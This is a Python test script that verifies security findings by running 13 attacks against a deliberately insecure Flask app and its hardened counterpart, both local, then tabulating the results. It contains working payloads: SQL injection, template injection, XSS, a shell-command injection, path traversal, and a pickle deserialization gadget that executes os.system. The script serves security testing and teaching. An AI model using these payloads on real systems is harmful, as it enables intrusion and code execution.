"""Dynamic verification: runs the same attacks against the insecure and the secure app.
Usage: python verify_findings.py   (needs: pip install flask)"""
import base64, importlib.util, os, pickle, sqlite3, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
TMP = tempfile.mkdtemp()
MARKER = os.path.join(TMP, "pickle_rce_marker.txt")
PW = "Str0ng-Pass-123"


def load(name, folder):
    os.environ.update(NOTES_DB=os.path.join(TMP, name + ".db"), ADMIN_PASSWORD="Adm1n-Str0ng-Pass!", COOKIE_SECURE="0")
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, folder, "app.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class Evil:
    def __reduce__(self):
        return (os.system, ("echo RCE > " + MARKER,))


def text(r):
    return r.get_data(as_text=True)


def insecure_user(m, name):
    c = m.app.test_client()
    c.post("/register", data={"username": name, "password": PW})
    return c, c.post("/login", data={"username": name, "password": PW})


def secure_user(m, name):
    c = m.app.test_client()
    tok = c.get("/csrf-token").get_json()["csrf_token"]
    c.post("/register", data={"username": name, "password": PW}, headers={"X-CSRF-Token": tok})
    r = c.post("/login", data={"username": name, "password": PW}, headers={"X-CSRF-Token": tok})
    return c, r.get_json()["csrf_token"], r


def attack_insecure(m):
    R = {}
    c = m.app.test_client()
    r = c.post("/login", data={"username": "admin'--", "password": "x"})
    R["F1"] = r.status_code == 200 and "Welcome admin" in text(r)
    R["F4"] = "49" in text(c.get("/search", query_string={"q": "{{7*7}}"}))
    R["F5"] = "<script>alert(1)</script>" in text(c.get("/search", query_string={"q": "<script>alert(1)</script>"}))
    R["F2"] = "1338" in text(c.get("/ping", query_string={"host": "127.0.0.1 & echo 1338"}))
    R["F6"] = "INTENTIONALLY VULNERABLE" in text(c.get("/download", query_string={"file": "../app.py"}))
    R["F11"] = text(c.post("/notes", data={"body": "csrf-test"})) == "saved"
    bob, login = insecure_user(m, "bob")
    R["F7"] = "backup key" in text(bob.get("/note/1"))
    R["F9"] = sqlite3.connect(m.DB).execute("SELECT password FROM users WHERE username='bob'").fetchone()[0] == __import__("hashlib").md5(PW.encode()).hexdigest()
    cookie = login.headers.get("Set-Cookie", "").lower()
    R["F13"] = "httponly" not in cookie and "Content-Security-Policy" not in login.headers
    R["F8"] = "supersecret123" in open(os.path.join(ROOT, "insecure_app", "app.py")).read()
    R["F10"] = "debug=True" in open(os.path.join(ROOT, "insecure_app", "app.py")).read()
    evil = m.app.test_client()
    evil.set_cookie("session", base64.b64encode(pickle.dumps(Evil())).decode())
    try:
        evil.get("/search?q=a")
    except Exception:
        pass
    R["F3"] = os.path.exists(MARKER)
    codes = [bob.post("/login", data={"username": "bob", "password": "wrong%d" % i}).status_code for i in range(8)]
    R["F12"] = 429 not in codes and bob.post("/login", data={"username": "bob", "password": PW}).status_code == 200
    return R


def attack_secure(m):
    R = {}
    c = m.app.test_client()
    tok = c.get("/csrf-token").get_json()["csrf_token"]
    r = c.post("/login", data={"username": "admin'--", "password": "x"}, headers={"X-CSRF-Token": tok})
    R["F1"] = r.status_code == 200
    bob, tok, login = secure_user(m, "bob")
    R["F4"] = "49" in text(bob.get("/search", query_string={"q": "{{7*7}}"}))
    R["F5"] = "<script>alert(1)</script>" in text(bob.get("/search", query_string={"q": "<script>alert(1)</script>"}))
    R["F2"] = "1338" in text(bob.get("/ping", query_string={"host": "127.0.0.1 & echo 1338"}))
    r = bob.get("/download", query_string={"file": "../app.py"})
    R["F6"] = "SECURE version" in text(r)
    R["F11"] = bob.post("/notes", data={"body": "csrf-test"}).status_code == 201
    R["F7"] = "backup key" in text(bob.get("/note/1"))
    h = sqlite3.connect(m.DB).execute("SELECT password FROM users WHERE username='bob'").fetchone()[0]
    R["F9"] = not h.startswith(("scrypt:", "pbkdf2:"))
    cookie = login.headers.get("Set-Cookie", "").lower()
    R["F13"] = "httponly" not in cookie or "Content-Security-Policy" not in login.headers
    R["F8"] = "supersecret123" in open(os.path.join(ROOT, "secure_app", "app.py")).read()
    R["F10"] = "debug=True" in open(os.path.join(ROOT, "secure_app", "app.py")).read()
    if os.path.exists(MARKER):
        os.remove(MARKER)
    evil = m.app.test_client()
    evil.set_cookie("session", base64.b64encode(pickle.dumps(Evil())).decode())
    evil.get("/search?q=a")
    R["F3"] = os.path.exists(MARKER)
    codes = [bob.post("/login", data={"username": "bob", "password": "wrong%d" % i}, headers={"X-CSRF-Token": tok}).status_code for i in range(8)]
    R["F12"] = 429 not in codes
    return R


NAMES = {"F1": "SQL Injection", "F2": "OS Command Injection", "F3": "Insecure Deserialization (pickle cookie)",
         "F4": "Server-Side Template Injection", "F5": "Cross-Site Scripting (XSS)", "F6": "Path Traversal",
         "F7": "IDOR / Broken Access Control", "F8": "Hardcoded Secrets", "F9": "Weak Password Hashing (MD5)",
         "F10": "Debug Mode Enabled", "F11": "Missing CSRF Protection", "F12": "No Brute-Force Protection",
         "F13": "Missing Security Headers / Cookie Flags"}

if __name__ == "__main__":
    v = attack_insecure(load("insecure", "insecure_app"))
    s = attack_secure(load("secure", "secure_app"))
    lines = ["%-4s %-42s %-14s %-12s" % ("ID", "Finding", "Insecure app", "Secure app"), "-" * 76]
    for k in NAMES:
        lines.append("%-4s %-42s %-14s %-12s" % (k, NAMES[k], "EXPLOITED" if v[k] else "not exploited", "STILL VULN" if s[k] else "BLOCKED"))
    lines.append("-" * 76)
    lines.append("Exploited in insecure app: %d/13 | Still vulnerable in secure app: %d/13" % (sum(v.values()), sum(s.values())))
    out = "\n".join(lines)
    print(out)
    open(os.path.join(ROOT, "scan_results", "verification_results.txt"), "w").write(out + "\n")